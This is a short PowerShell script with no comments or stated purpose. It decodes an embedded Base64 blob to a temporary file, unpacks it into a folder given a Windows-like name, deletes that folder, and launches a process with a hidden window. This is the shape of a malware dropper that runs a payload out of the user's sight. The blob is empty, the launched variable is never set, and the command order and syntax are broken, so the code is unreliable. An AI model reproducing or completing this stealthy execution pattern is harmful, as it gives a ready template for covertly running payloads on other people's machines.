$temp = New-TemporaryFile
$base64 = ""

$bytes = [System.Convert]::FromBase64String($base64)
[System.IO.File]::WriteAllBytes($temp.FullName, $bytes)

Expand-Archive -Path $temp.FullName -DestinationPath Join-Path $temp "WindowsTempData"
Remove-Item "WindowsTempData"
Start-Process $exec -WindowStyle Hidden